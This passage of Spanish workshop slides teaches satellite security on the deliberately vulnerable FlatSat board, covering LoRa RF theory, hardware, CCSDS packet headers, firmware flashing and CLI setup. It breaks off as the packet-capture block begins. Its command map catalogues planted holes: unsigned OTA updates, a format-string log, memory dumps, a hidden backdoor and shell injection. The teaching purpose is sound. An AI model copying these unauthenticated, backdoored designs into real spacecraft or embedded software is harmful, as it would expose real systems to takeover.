@@ -1,0 +1,1748 @@
+1
+
+Taller práctico de hacking de
+sistemas satelitales,
+ con FlatSat.
+Seguridad espacial para principiantes.
+RF, CCSDS, telemetría y telecomando sobre LoRa.
+Conferencia Unknown · Perú · 8 h · presencial
+2
+
+BienvenidasBienvenidos
+Meow Meow.
+3
+
+[FOTO
+EDUARDO]
+Eduardo ContrerasDirector de Tecnología (CTO)
+Ing. en Electrónica.
+Co-fundador de Electronic Cats.
+Aficionado del RF y el hardware hacking.
+Fanático de la cerveza artesanal y los juegos de mesa.
+@ForeverWero
+4
+
+Andrés [SABAS][CEO / LIDER DE INGENIERIA]
+Ing. Electronica
+Lider de Ingenieria en Electronic Cats
+OpenSource
+Juegos de mesa y comida
+@sabasacustico
+[FOTO
+ANDRÉS]
+5
+
+00
+Bloque 0
+Introducción y logística
+6
+
+BLOQUE 0 · LOGÍSTICA
+Lo que vamos a ver
+¿Dónde está mi satélite?
+Bloque 0: Introducción y logística.
+Bloque 1: Qué es FlatSat y su arquitectura.
+Bloque 2: Teoría de base — RF, espectro, LoRa y antenas.
+Bloque 3: Hardware — radios, sensores y puntos de prueba.
+Bloque 4: CCSDS / Space Packet Protocol.
+Bloque 5: Carga de firmware (UF2) y validación de enlace.
+Bloque 6: Captura de paquetes con CatSniffer.
+Bloque 7: Seguridad — modelo de amenazas y vectores.
+Bloque 8: Ejercicios de ataque y defensa (USB + RF).
+Cierre: reto integrador (CTF) y preguntas.
+7
+
+BLOQUE 0 · LOGÍSTICA
+Agenda y tiempos (8 h)
+Hora
+Bloque
+Min
+09:00
+0 · Registro, setup y verificación
+30
+09:30
+1 · Introducción, contexto y reglas
+40
+10:10
+2 · Teoría de base RF + 3 · Hardware
+60
+11:10
+ Pausa
+15
+11:25
+4 · CCSDS / SPP: anatomía del paquete
+55
+12:20
+5 · Carga de firmware (UF2) y enlace
+45
+13:05
+ Comida
+45
+13:50
+6 · Captura y análisis (CatSniffer)
+60
+14:50
+7 · Seguridad: amenazas y vectores
+45
+15:35
+8 · Ejercicios de ataque y defensa
+90
+17:05
+9 · Reto integrador (CTF) y cierre
+55
+60% práctica · 27% teoría/demo · pausas incluidas. Hora de inicio orientativa.
+8
+
+BLOQUE 0 · LOGÍSTICA
+Reglas, ética y alcance
+Entorno controlado
+Todo ocurre sobre hardware del taller.
+No atacamos redes ni dispositivos ajenos.
+Banda ISM (915/916 MHz), nunca bandas espaciales reservadas.
+Potencia y alcance limitados al aula.
+Ética del hacking
+El objetivo es aprender a defender, entendiendo el ataque.
+Lo aprendido aplica a sistemas reales: úsalo con responsabilidad.
+Documenta y comparte hallazgos de forma constructiva.
+Pregunta siempre que tengas dudas de alcance.
+9
+
+BLOQUE 0 · LOGÍSTICA
+Clonado del repositorio oficial y Setup del CLI
+Concepto
+Clonado del repositorio oficial de la Estación Terrena (flatsat-ground-station), creación de un entorno virtual aislado (.venv), instalación de dependencias y configuración del alias global flatsat para interactuar con la tarjeta.
+
+# 1. Clonar el repositorio oficial de la Estación Terrena
+git clone https://github.com/ElectronicCats/flatsat-ground-station.git
+cd flatsat-ground-station
+# --- EN LINUX / MACOS ---
+python3 -m venv .venv
+source .venv/bin/activate
+pip install --upgrade pip && pip install -r requirements.txt
+# --- EN WINDOWS (PowerShell) ---
+Ejecutar el install_windows.bat
+Actualizar la terminal . $PROFILE
+
+
+
+
+10
+
+BLOQUE 0 · LOGÍSTICA
+Clonado del repositorio oficial y Setup del CLI
+Concepto
+Configuración del atajo global flatsat para ejecutar el CLI desde cualquier terminal sin escribir la ruta completa del intérprete.
+
+
+# --- LINUX (~/.bashrc) ---
+echo "alias flatsat='$(pwd)/.venv/bin/python3 $(pwd)/flatsat_cli.py'" >> ~/.bashrc && source ~/.bashrc
+
+# --- MACOS (~/.zshrc) ---
+echo "alias flatsat='$(pwd)/.venv/bin/python3 $(pwd)/flatsat_cli.py'" >> ~/.zshrc && source ~/.zshrc
+
+
+
+
+
+
+
+11
+
+01
+Bloque 1
+¿Qué es FlatSat?
+12
+
+BLOQUE 1 · FLATSAT
+Objetivo del bloque
+Al finalizar, los participantes:
+Comprenderán qué es FlatSat y por qué es una plataforma «vulnerable a propósito».
+Reconocerán la arquitectura general y su analogía con un satélite real.
+Identificarán los subsistemas: cómputo, comunicaciones, energía y sensores.
+Entenderán el flujo de datos entre hardware, firmware, telemetría y RF.
+13
+
+BLOQUE 1 · FLATSAT
+¿Qué es FlatSat?
+FlatSat es una plataforma educativa de hardware para aprender ciberseguridad espacial en un entorno controlado. Replica los subsistemas de un satélite pequeño sobre una placa plana (de ahí «flat sat»).
+Proyecto de PWNSAT × Electronic Cats.
+Basado en el microcontrolador RP2040.
+Comunicaciones por LoRa en banda ISM.
+Hardware y firmware open source (CERN-OHL / GPL).
+Companion del curso PwnSat.
+14
+
+BLOQUE 1 · FLATSAT
+«Vulnerable a propósito»
+El Problema: Un satélite real en órbita es costoso e inalcanzable para la mayoría de los investigadores de seguridad.
+La Solución: FlatSat reproduce deliberadamente las debilidades históricas de las misiones espaciales:
+Enlaces de radio sin cifrado nativo.
+Telecomandos sin firma ni autenticación.
+Validación deficiente o nula de parámetros en firmware.
+Permite ejecutar ataques reales en tiempo real sin riesgo de perder una misión millonaria.
+Cada vulnerabilidad expuesta es una lección directa de cómo diseñar la mitigación correcta.
+15
+
+BLOQUE 1 · FLATSAT
+Ciberseguridad espacial
+Disciplina emergente: cada vez más satélites, menos atención a su seguridad.
+Contexto Actual: Crecimiento exponencial de constelaciones LEO (Starlink, OneWeb, CubeSats académicos).
+Deuda Técnica: Durante décadas se prioriza el presupuesto de enlace RF sobre la seguridad lógica.
+Se asumió erróneamente el "aislamiento por distancia" (Security through Obscurity / Distance).
+Realidad: Con SDRs (Software Defined Radios) y transceptores económicos, cualquiera puede escuchar e inyectar en bandas de satélite.
+Falta de Talento: Se requieren profesionales que entiendan la convergencia entre RF, firmware y protocolos espaciales.
+
+16
+
+BLOQUE 1 · FLATSAT
+Analogía con un satélite real
+Subsistema real
+En FlatSat
+OBC (computador de a bordo)
+RP2040 (Core 0/1)
+COMMS (comunicaciones)
+2× SX1262 LoRa (uplink/downlink)
+ADCS (actitud)
+Acelerómetro LIS2DH12
+Payload / sensores
+BME280 (temp, presión, humedad)
+EPS (energía)
+Gestión de alimentación de la placa
+Telemetría / Telecomando
+CCSDS Space Packets (TM/TC)
+17
+
+BLOQUE 1 · FLATSAT
+Flujo de datos extremo a extremo
+Sensores
+(BME280 / LIS2DH12)
+▶
+Empaqueta CCSDS
+▶
+SX1262
+Downlink 916 MHz
+▶
+Estación terrena
+(CatSniffer)
+Downlink:Telemetria (Tm)
+18
+
+BLOQUE 1 · FLATSAT
+Uplink: Telecomando (Tc)
+Estacion Terrena
+(Catsniffer / CLI)
+▶
+SX1262 Radio 0
+Uplink (918 MHz)
+▶
+Desempaquetador
+CCSDS en RP2040
+▶
+Ejecucion en accion
+19
+
+02
+Bloque 2
+Teoría de base: RF y comunicaciones
+20
+
+BLOQUE 2 · TEORÍA RF
+Objetivo del bloque
+Al finalizar, los participantes:
+Comprenderán qué es una onda electromagnética y el espectro de RF.
+Manejarán los conceptos de frecuencia, potencia, sensibilidad y ancho de banda.
+Entenderán qué es la modulación y cómo funciona LoRa (CSS).
+Conocerán nociones de antenas, link budget e impedancia.
+21
+
+BLOQUE 2 · TEORÍA RF
+¿Qué es una onda electromagnética?
+Combinación de campos eléctrico y magnético oscilando juntos.
+Se propaga por el espacio transportando energía de un punto a otro.
+No necesita medio físico: viaja en el vacío (por eso sirve en el espacio).
+Una antena convierte señales eléctricas en ondas EM y viceversa.
+22
+
+BLOQUE 2 · TEORÍA RF
+El espectro electromagnético
+De menor a mayor frecuencia:
+Radio
+Microondas
+Infrarrojo
+Visible
+UV
+Rayos X
+Gamma
+FlatSat y LoRa operan en la banda de radio (sub-GHz, 915–916 MHz).
+23
+
+BLOQUE 2 · TEORÍA RF
+Frecuencia, longitud de onda y banda
+Frecuencia central: dónde se concentra la energía de la señal. Se mide en Hz.
+Longitud de onda (λ): distancia de un ciclo; inversamente proporcional a la frecuencia.
+Banda: rango de frecuencias asignado a un uso. ISM = uso libre sin licencia.
+FlatSat usa la banda ISM sub-GHz de América (~915 MHz), no bandas espaciales reservadas.
+24
+
+BLOQUE 2 · TEORÍA RF
+Potencia de transmisión y sensibilidad
+Potencia de TX
+Energía con la que se genera la señal en el medio.
+Se mide en dBm. FlatSat: 22 dBm.
+Más potencia = más alcance, pero más consumo e interferencia.
+Sensibilidad de RX
+Energía mínima que el receptor necesita para decodificar.
+Cuanto más sensible, más lejos puede oír.
+LoRa destaca por su altísima sensibilidad.
+El balance entre ambas define cuán lejos y confiable es el enlace.
+25
+
+BLOQUE 2 · TEORÍA RF
+Conceptos clave de comunicación
+Concepto
+Definición
+Ancho de banda
+Cantidad de espectro disponible para transmitir información.
+Canal
+La frecuencia concreta donde se transmite la información.
+Señal portadora
+Señal base que «lleva» la información (sobre ella va la modulación).
+Tiempo en aire
+Cuánto dura un paquete en el medio (depende de SF y BW).
+26
+
+BLOQUE 2 · TEORÍA RF
+Uplink y Downlink
+Uplink — 916 MHz
+Sentido tierra → satélite.
+Lleva los telecomandos (TC).
+El satélite escucha aquí.
+Downlink — 915 MHz
+Sentido satélite → tierra.
+Lleva la telemetría (TM).
+La estación terrena captura aquí.
+La estación terrena hace lo inverso del satélite: captura en 915, inyecta en 916.
+27
+
+BLOQUE 2 · TEORÍA RF
+¿Qué es la modulación?
+Es «escribir» información sobre una señal portadora variando alguna de sus propiedades.
+Se puede variar amplitud (AM), frecuencia (FM) o fase (PM).
+La demodulación es el proceso inverso en el receptor.
+LoRa usa una modulación especial llamada CSS (Chirp Spread Spectrum).
+28
+
+BLOQUE 2 · TEORÍA RF
+¿Qué es LoRa?
+LoRa = Long Range. Modulación de bajo consumo y largo alcance en sub-GHz.
+Usa CSS: la portadora «barre» frecuencias en forma de chirp ascendente/descendente.
+Esto la hace muy robusta al ruido y permite recibir señales muy débiles.
+Ideal para IoT y, en este taller, para el enlace educativo del satélite.
+29
+
+BLOQUE 2 · TEORÍA RF
+Parámetros de LoRa: SF, BW, CR
+Parámetro
+Qué controla
+En FlatSat
+Spreading Factor (SF)
+Robustez vs velocidad. Mayor SF = más alcance, más lento.
+SF7
+Bandwidth (BW)
+Ancho del canal. Mayor BW = más rápido, menos sensible.
+125 kHz
+Coding Rate (CR)
+Redundancia para corregir errores.
+4/5
+Emisor y receptor deben coincidir EXACTAMENTE en estos parámetros para entenderse.
+30
+
+BLOQUE 2 · TEORÍA RF
+Link budget y EIRP
+Link budget: la «contabilidad» de ganancias y pérdidas del enlace.
+Potencia TX + ganancias de antena − pérdidas ≥ sensibilidad RX → hay enlace.
+EIRP (Potencia Efectiva Radiada): potencia que «parece» emitir la antena en su dirección de máximo.
+Sirve para estimar alcance y para cumplir límites regulatorios de la banda ISM.
+31
+
+BLOQUE 2 · TEORÍA RF
+Antenas: tipos y uso
+Tipo
+Característica
+Uso típico
+Omnidireccional
+Irradia en todas direcciones.
+Cobertura general, GS fija.
+Direccional
+Concentra energía en una dirección.
+Apuntar a un objetivo lejano.
+Monopolo / dipolo
+Sencillas, λ/4 o λ/2.
+La mayoría de módulos LoRa.
+La antena correcta puede importar más que subir la potencia de transmisión.
+32
+
+BLOQUE 2 · TEORÍA RF
+Impedancia y los 50 Ω
+Impedancia (Z): Oposición total al flujo de corriente en circuitos de alta frecuencia.
+Principio de Máxima Transferencia de Potencia: La impedancia de la fuente, la línea de transmisión (cable) y la carga (antena) deben igualarse exactamente (Zfuente=Zcable=Zantena=50 Ω
+Desadaptación: Si no coinciden, parte de la señal transmitida se refleja de regreso (SWR - Standing Wave Ratio), degradando el enlace y calentando el transceptor.
+Todos los conectores SMA, cables y antenas de FlatSat están estandarizados a 50 Ω
+
+
+
+33
+
+03
+Bloque 3
+Hardware de FlatSat
+34
+
+BLOQUE 3 · HARDWARE
+Objetivo del bloque
+Al finalizar, los participantes:
+Identificarán cada módulo, conector y bus sobre el PCB.
+Comprenderán el rol de los dos radios SX1262 y de los sensores.
+Localizarán puntos de prueba e interfaces de depuración.
+Reconocerán los dos endpoints USB y su función.
+35
+
+BLOQUE 3 · HARDWARE
+Componentes principales
+Componente
+Detalle
+Interfaz
+MCU
+RP2040 dual-core Cortex-M0+
+—
+Radio 0 (Uplink)
+SX1262 — LoRa
+SPI0, NSS GPIO17
+Radio 1 (Downlink)
+SX1262 — LoRa
+SPI0, NSS GPIO5
+Acelerómetro
+LIS2DH12
+I²C (SDA20 / SCL21)
+Ambiental
+BME280 (temp/pres/hum)
+I²C (SDA20 / SCL21)
+Status LED
+WS2812B NeoPixel
+GPIO15
+Botones
+BOOT / BUTTON1 / BUTTON2
+GPIO12 / GPIO13
+36
+
+BLOQUE 3 · HARDWARE
+Los dos radios SX1262 (1/2)
+FlatSat lleva DOS transceptores SX1262 independientes.
+Esto permite escuchar y transmitir en frecuencias distintas a la vez (full-duplex en frecuencia).
+Radio 0 — Downlink (NSS GPIO17): escucha telecomandos en 915 MHz.
+Es el «oído» del satélite hacia la estación terrena.
+37
+
+BLOQUE 3 · HARDWARE
+Los dos radios SX1262 (2/2)
+Radio 1 — Uplink (NSS GPIO5): transmite telemetría en 916 MHz.
+Es la «voz» del satélite: envía estado, sensores y beacons.
+Ambos comparten el bus SPI0, diferenciados por su línea NSS (chip select).
+Para capturar al satélite, la estación terrena sintoniza el downlink (916).
+38
+
+BLOQUE 3 · HARDWARE
+El cerebro: RP2040
+Microcontrolador dual-core Cortex-M0+ de Raspberry Pi.
+Bajo costo, muy difundido, fácil de flashear (modo UF2).
+En FlatSat ejecuta una arquitectura AMP: un núcleo para RF/misión, otro para USB/C2.
+Sin sistema operativo: firmware bare-metal con máquina de estados.
+39
+
+BLOQUE 3 · HARDWARE
+Sensores: la telemetría
+BME280
+Temperatura.
+Presión barométrica.
+Humedad relativa.
+Altitud estimada.
+LIS2DH12
+Acelerómetro de 3 ejes.
+Simula el control de actitud (ADCS).
+Aporta X, Y, Z y temperatura.
+Estos valores son los que el satélite empaqueta y transmite como telemetría.
+40
+
+BLOQUE 3 · HARDWARE
+Indicadores y controles
+NeoPixel WS2812B (GPIO15): LED RGB de estado.
+Parpadea al recibir RF → útil para confirmar que un ataque llegó.
+Botón BOOT: entra en modo bootloader para flashear (UF2).
+BUTTON1 / BUTTON2: interacción y disparo de funciones.
+41
+
+BLOQUE 3 · HARDWARE
+Buses de comunicación
+Bus
+Conecta
+Por qué importa al atacante
+SPI0
+RP2040 ↔ los 2× SX1262
+Donde viven los datos de RF.
+I²C
+RP2040 ↔ BME280 / LIS2DH12
+Origen de la telemetría.
+USB
+RP2040 ↔ laptop
+Consola + canales para los Radios (Ruta A).
+42
+
+BLOQUE 3 · HARDWARE
+Puntos de prueba y superficie física
+Interfaces de Depuración Explicitas:
+Pines SWD (SWCLK, SWDIO, GND, 3V3): Permiten conectar un depurador probe (J-Link / Raspberry Debug Probe) para volcar la memoria Flash completa o pausar la ejecución del procesador.
+Pines UART (TX, RX): Consola serie serie sin autenticación.
+Test Points (TP): Puntos de medición para analizador lógico o osciloscopio.
+Lección de Seguridad: En sistemas embebidos, el acceso físico rompe cualquier control lógico.
+
+43
+
+BLOQUE 3 · HARDWARE
+Los tres endpoints USBEl firmware expone 3 CDC-ACM: Cat-Radio0 (datos R0), Cat-Radio1 (datos R1) y Cat-Shell (consola + config).
+Endpoint 1 y 2 — Cat-Radio 0 y 1
+Datos crudos del Radio 0 y 1
+115200 baud.
+Para observar qué hace los radios.
+Endpoint 3 — Catshell
+Inyección de telecomandos por USB.
+115200 baud.
+Es la base de la Ruta A de ataque.
+VID:PID 0x239A:0xCAFE · Producto: «Pwnsat - Flatsat».
+44
+
+04
+Bloque 4
+CCSDS Space Packet Protocol
+45
+
+BLOQUE 4 · CCSDS
+Objetivo del bloque
+Al finalizar, los participantes:
+Entenderán qué es CCSDS y por qué se usa en sistemas espaciales.
+Distinguirán telemetría (TM) de telecomando (TC).
+Decodificarán byte a byte el Primary Header de 6 bytes.
+Comprenderán el rol de los APIDs y el formato de telemetría.
+46
+
+BLOQUE 4 · CCSDS
+¿Qué es CCSDS?
+CCSDS = Consultative Committee for Space Data Systems.
+Conjunto de estándares usados por agencias espaciales (NASA, ESA, etc.).
+El Space Packet Protocol (SPP) define cómo se estructuran los paquetes de datos.
+Punto clave de seguridad: SPP no incluye autenticación ni cifrado por sí mismo.
+https://ccsds.org/Pubs/133x0b2e2.pdf
+47
+
+BLOQUE 4 · CCSDS
+¿Qué es CCSDS?
+El registro de números (muy relevante para el bloque de APIDs) La SANA (Space Assigned Numbers Authority) es el registrador operativo del CCSDS que lleva el control de las asignaciones clave de numeración: IDs de nave, números de versión de protocolo y APIDs reservados. Es justo el concepto que conecta con el APID del taller: https://sanaregistry.org. Ahí pueden ver, por ejemplo, que el APID 0x7FF (todos unos) está reservado para paquetes idle.
+Código de colores de los libros CCSDS (útil para que sepan qué están leyendo):
+Blue Book → estándar recomendado (normativo).
+Green Book → informe informativo (explicaciones, contexto).
+Magenta Book → prácticas recomendadas.
+Yellow/Orange → procedimientos y experimentales.
+
+48
+
+BLOQUE 4 · CCSDS
+Telemetría vs Telecomando
+TM — Telemetría
+Type = 0.
+Baja del satélite a tierra.
+Estado, sensores, beacons.
+Es lo que capturamos.
+TC — Telecomando
+Type = 1.
+Sube de tierra al satélite.
+Órdenes y configuración.
+Es lo que inyectamos.
+49
+
+BLOQUE 4 · CCSDS
+El Primary Header (6 bytes)
+Bytes 0-1
+Packet IdentificationVersión(3) · Type(1) · SecHdr(1) · APID(11)
+Bytes 2-3
+Packet Sequence ControlSeqFlags(2) · SeqCount(14)
+Bytes 4-5
+Packet Length(longitud del Data Field) − 1
+Tras estos 6 bytes viene el Data Field (el contenido del comando o la telemetría).
+50
+
+BLOQUE 4 · CCSDS
+Campo 1: Packet Identification
+Version Number (3 bits): siempre 0 para CCSDS.
+Type (1 bit): 0 = telemetría, 1 = telecomando.
+Secondary Header Flag (1 bit): si hay cabecera secundaria.
+APID (11 bits): identifica el destino/función del paquete.
+Este primer par de bytes ya te dice si es TM o TC y a qué subsistema va.
+51
+
+BLOQUE 4 · CCSDS
+Campo 2: Packet Sequence Control
+Sequence Flags (2 bits): normalmente 11 = paquete no segmentado.
+Sequence Count (14 bits): contador incremental de paquetes.
+El contador permite detectar paquetes perdidos o fuera de orden...
+...y es justo lo que un esquema anti-replay debería validar (pero aquí no se valida).
+52
+
+BLOQUE 4 · CCSDS
+Campo 3: Packet Length
+Indica la longitud del Data Field... menos 1.
+length = (número de bytes de datos) − 1
+Es una fuente clásica de errores al construir paquetes a mano.
+Si el length no cuadra con los datos, el receptor parsea mal el paquete.
+53
+
+BLOQUE 4 · CCSDS
+APIDs: el direccionamiento
+El APID (11 bits) enruta cada paquete a una función o subsistema.
+Es como el «endpoint» de una API: cada número hace algo distinto.
+Descubrir el mapa de APIDs es descubrir la superficie de comandos del satélite.
+Un APID desconocido responde «Error Unknown APID» → oráculo para brute-force.
+54
+
+BLOQUE 4 · CCSDS
+Mapa de telecomandos (APIDs)
+APID
+Comando
+Efecto
+0x20
+TC_COMMAND
+despacha por opcode (ver abajo)
+0x21
+SET_FREQ
+cambia la frecuencia (4 bytes BE, Hz)
+0x22
+SET_POWER
+potencia TX (1 byte, 2–22 dBm)
+0x26
+FIRMWARE_UPDATE
+OTA sin firma (vuln)
+0x27
+SET_DIFFICULTY
+nivel 0–3
+0x30
+DIAG_LOG
+log (vuln format-string)
+0x31
+DIAG_MEMORY
+volcado de memoria (addr+len)
+0x39
+SECRET_DEBUG
+backdoor oculto (solo por reversing)
+0x7F
+IDLE
+payload “pwnsat2” 
+55
+
+BLOQUE 4 · CCSDS
+Mapa de telecomandos (APIDs)
+APID
+Comando
+Efecto
+0x10
+PING
+responde PONG (TM heartbeat 0x001)
+0x01
+SAFE
+cambia el modo de vuelo
+0x02
+NOMINAL
+cambia el modo de vuelo
+0x03
+DEBUG
+cambia el modo de vuelo
+0x30
+SET_TM_RATE
+cadencia de telemetría (1–3600 s)
+0x40
+OVERRIDE_SENSOR
+temperatura falsa sin validar → flag SPOOFED_TEMP_9999
+0x42
+READ_FLAG
+lee una flag CTF
+0xEE
+EXEC
+Inyecta texto al shell → un “reboot” = logic bomb
+0xFF
+BACKDOOR
+56
+
+BLOQUE 4 · CCSDS
+Formato de la telemetría
+Cada tipo de reporte de telemetría posee su propio APID y formato de empaquetado en binario Little-Endian:
+APID 0x001 - HEARTBEAT:
+sc_id (u8), uptime (u32), battery_mv (u16), flight_mode (u8), difficulty (u8), tc_count (u16), error_count (u16).
+APID 0x010 - BME280 (Ambiental):
+temp (int16 / 100), presión (uint32 / 10), humedad (uint8).
+APID 0x011 - LIS2DH12 (ADCS):
+accel_x, accel_y, accel_z (int16 en mg).
+Decodificación: Herramienta CLI de Python → python3 ccsds_tools.py parse <hex>.
+
+
+57
+
+BLOQUE 4 · CCSDS
+bytes crudos por RF
+Por RF viajan los BYTES CCSDS CRUDOS sobre LoRa.
+No hay representación ASCII-hex ni hexStringToBytes().
+  El comando USB "TX <hex>" solo le dice al CatSniffer qué bytes emitir;
+  al aire salen esos bytes, y el satélite los recibe en Radio 1
+  y los procesa como un TC normal.
+58
+
+05
+Bloque 5
+Carga de firmware y validación
+59
+
+BLOQUE 5 · FIRMWARE
+Objetivo del bloque
+Al finalizar, los participantes:
+Entenderán qué es el formato UF2 y por qué no hace falta compilar.
+Pondrán el RP2040 en modo bootloader y flashearán el firmware.
+Validarán el arranque y el enlace LoRa por consola.
+Resolverán los problemas más comunes de carga y enlace.
+60
+
+BLOQUE 5 · FIRMWARE
+¿Qué es UF2?
+UF2 = USB Flashing Format, Formato de archivo desarrollado por Microsoft para flashear microcontroladores fácilmente por USB.
+Funcionamiento:
+Al presionar el botón BOOT al conectar, el RP2040 se enumera como una memoria USB de almacenamiento masivo llamada RPI-RP2.
+Flashear consiste en un simple proceso de arrastrar y soltar (Drag & Drop) el archivo zephyr.uf2 a dicha unidad.
+La memoria se desmonta automáticamente y el microcontrolador se reinicia ejecutando el nuevo firmware.
+No se compila nada en el taller: usamos un binario ya preparado.
+61
+
+BLOQUE 5 · FIRMWARE
+Paso 1: entrar en modo bootloader
+1. Desconecta la FlatSat.
+2. Mantén pulsado el botón BOOT.
+3. Conéctala por USB sin soltar BOOT.
+4. Suelta BOOT.
+Aparecerá una unidad llamada RPI-RP2.
+62
+
+BLOQUE 5 · FIRMWARE
+Paso 2: flashear (drag & drop)
+Arrastra zephyr.uf2 a la unidad RPI-RP2.
+La unidad se desmonta sola al terminar la copia.
+El RP2040 se reinicia automáticamente con el nuevo firmware.
+El NeoPixel parpadea blanco → se apaga → empieza la telemetría.
+63
+
+BLOQUE 5 · FIRMWARE
+Paso 3: Eliminacion de minicom y PuTTY
+El Enfoque Tradicional: El uso de clientes serie genéricos (PuTTY, minicom, screen) requiere descubrir manualmente nombres de puertos, configurar velocidades complejas de baudios y lidiar con bloqueos de terminal.
+La Solución FlatSat: El taller incluye la herramienta CLI interactiva en Python (flatsat_cli.py).
+Auto-detecta los puertos serie de FlatSat basándose en el VID:PID (0x239A:0xCAFE).
+Formatea la telemetría en pantalla con colores y tablas estructuradas.
+Permite enviar telecomandos directos sin recordar tramas hex a mano.
+
+
+
+64
+
+BLOQUE 5 · FIRMWARE
+Paso 4:Instalación del CLI
+Concepto
+Verificación de la descarga del repositorio oficial flatsat-ground-station, activación del entorno virtual .venv y enlace del CLI ejecutable flatsat_cli.py.
+
+# 1. Verificar ubicación en la carpeta del repositorio oficial
+cd flatsat-ground-station
+# 2. Confirmar activación del entorno virtual
+source .venv/bin/activate    # En Windows: .venv\Scripts\activate
+# 3. Validar alias o ejecutar directamente el CLI
+flatsat --help               # O ejecutar: python3 flatsat_cli.py --help
+
+
+
+65
+
+BLOQUE 5 · FIRMWARE
+Paso 5:Comandos de Diagnóstico y consulta con el CLI flatsat
+
+
+
+Commando CLI
+Descripción / Resultado Esperado
+flatsat devices
+Lista todas las placas FlatSat conectadas y sus puertos asignados
+flatsat status
+Consulta versión de firmware, hash de Git, fecha de compilación y modo activo. 
+flatsat sensors 
+Muestra la telemetría I2C en pantalla (Temp, Presión, Humedad del BME280 y Acelerómetro). 
+flatsat identify 
+Hace parpadear rápidamente el LED NeoPixel para identificar la placa en la mesa. 
+flatsat reboot 
+Envía la instrucción de reinicio al RP2040 y monta automáticamente el modo BOOTSEL. 
+66
+
+BLOQUE 5 · FIRMWARE
+Paso 6:Comandos de configuración de misión
+
+# Cambiar rol operativo entre Ground Station (gs) y Satélite (sat)
+flatsat mode gs      # Detiene la telemetría automática y desbloquea parámetros LoRa
+flatsat mode sat     # Reanuda modo satélite en órbita
+# Configuración en caliente de parámetros LoRa
+flatsat config --radio 0 --freq 918000000 --sf 7 --bw 125 --apply
+# Modificar estados de vuelo y prueba
+flatsat flight nominal      # Estados: [safe | nominal | idle | debug]
+flatsat difficulty 2        # Modifica nivel de juego CTF [1 | 2 | 3]
+flatsat color 255 0 0       # Establece color estático en LED NeoPixel (R G B)
+flatsat cmd "1801c0000000"  # Envía comando crudo en ASCII-Hex al Catshell
+
+
+
+
+67
+
+BLOQUE 5 · FIRMWARE
+Paso 7: validar por consola
+Concepto
+Apertura del canal interactivo del satélite a 115200 baud para verificar la emisión continua de paquetes de telemetría.
+# Conectar a la consola interactiva de la tarjeta FlatSat
+flatsat cmd --interactive
+
+
+68
+
+BLOQUE 5 · FIRMWARE
+Troubleshooting de carga
+Síntoma
+Causa probable
+Solución
+No aparece RPI-RP2
+No entró en modo BOOT
+Repite la secuencia con BOOT pulsado
+No hay telemetría
+Puerto o baud incorrecto
+Verifica puerto y 921600 baud
+No parpadea azul al inyectar
+Parámetros LoRa mal
+Revisa freq/SF/BW del emisor
+69
+
+BLOQUE 5 · FIRMWARE
+Sintonizar antenas según tu configuración
+
+[!IMPORTANT] Antes de sintonizar radiofrecuencia, ejecuta el comando flatsat mode gs. Esto elimina la transmisión automática en la Radio 1 para pausar el downlink y evitar interferencias durante la sintonía. 
+# Pausar la transmisión continua para sintonizar limpiamente la radio
+flatsat mode gs
+
+
+
+
+
+70
+
+BLOQUE 5 · FIRMWARE
+Sintonía de Antenas — Caso A: Configuración con 2 FlatSats
+
+Escenario A: 2 Tarjetas FlatSat (Satélite Real + Estación Terrena)
+Ideal para grupos de 2 personas trabajando en pareja.
+Placa 1 (Satélite):
+Radio 0 en RX Uplink (918 MHz) → Conectar Antena física en SMA Radio 0.
+Radio 1 en TX Downlink (916 MHz) → Conectar Antena física en SMA Radio 1.
+Placa 2 (Ground Station / Atacante):
+Funciona en modo mode gs. Opera con una sola radio en la frecuencia de escucha o inyección.
+# Configurar Estación Terrena para escuchar el Downlink del Satélite (916 MHz)
+flatsat mode gs
+flatsat config --radio 0 --freq 916000000 --sf 7 --bw 125 --apply
+# Configurar satelite para enviar el Downlink del Satélite (916 MHz)
+flatsat mode gs
+flatsat config --radio 1 --freq 916000000 --sf 7 --bw 125 --apply
+
+
+
+
+
+
+
+
+71
+
+BLOQUE 5 · FIRMWARE
+Sintonia de antenas - caso B: 1 FlatSat
+Escenario B: 1 sola tarjeta FlatSat por participante
+Permite probar ataques y captura de forma individual en una sola computadora.
+Protección de Hardware: Conectar antenas físicas o atenuadores SMA Tanto en la Radio 0 como en la Radio 1 para proteger ambos transmisores.
+Principio: La Radio 1 transmite telemetría en 916 MHz y la Radio 0 se sintoniza a esa misma frecuencia para auto-escucharse en bucle local (Loopback).
+# Sintonizar ambas radios internamente a 916 MHz
+flatsat config --radio 0 --freq 916000000 --sf 7 --bw 125 --apply
+flatsat config --radio 1 --freq 916000000 --sf 7 --bw 125 --apply
+flatsat mode sat
+
+
+
+
+
+
+
+72
+
+BLOQUE 5 · FIRMWARE
+Sintonía de Antenas — Caso C: FlatSat + Módulo LoRa Externo (1/2)
+
+Escenario C: 1 FlatSat + Módulo LoRa Comercial Externo (Arduino / ESP32 / MicroPython)
+Ideal para integrar herramientas de radiofrecuencia personalizadas o hardware de terceros.
+Conectar antena adecuada para 
+915 MHz
+915MHz tanto en la Radio 0 de la FlatSat como en el módulo externo.
+Configuración de la FlatSat:
+flatsat config --radio 0 --freq 916000000 --sf 7 --bw 125 --syncword 18 --apply
+Parámetros de Código para Módulos LoRa Externos (Arduino / MicroPython)
+Para que un módulo comercial (Heltec, TTGO, SX1276/SX1262) se comunique con FlatSat, configura su código con los siguientes parámetros exactos:
+Frecuencia Central: 916.0 MHz (916000000Hz).
+Spreading Factor (SF): 7.
+Bandwidth (BW): 125.0 kHz (125000Hz).
+Coding Rate (CR): 4/5.
+Sync Word: 0x12 (Decimal 18 — Privado).
+Preamble Length: 8 u 12 símbolos.
+IQ Inversion: Desactivado (Normal).
+
+
+
+
+
+
+
+73
+
+06
+Bloque 6
+Captura y análisis
+74
+
+BLOQUE 6 · CAPTURA
+Objetivo del bloque
+Al finalizar, los participantes:
+Comprenderán qué es una estación terrena y su rol.
+Configurarán el CatSniffer para capturar el downlink.
+Decodificarán el header CCSDS de un paquete real.
+Reconstruirán la telemetría del satélite (telemetry hijacking).
+75
+
+BLOQUE 6 · CAPTURA
+¿Qué es una estación terrena?
+Ground Station (GS): Instalación o equipo en tierra encargado de mantener el enlace de comunicaciones con el satélite.
+En misiones reales (NOAA, ISS) consta de grandes antenas parabólicas con rotores de seguimiento orbital.
+En este taller, la herramienta portátil CatSniffer actúa como una Estación Terrena completa de bolsillo.
+
+76
+
+BLOQUE 6 · CAPTURA
+CatSniffer como estación terrena
+El CatSniffer integra un SX1262, el mismo radio que la FlatSat.
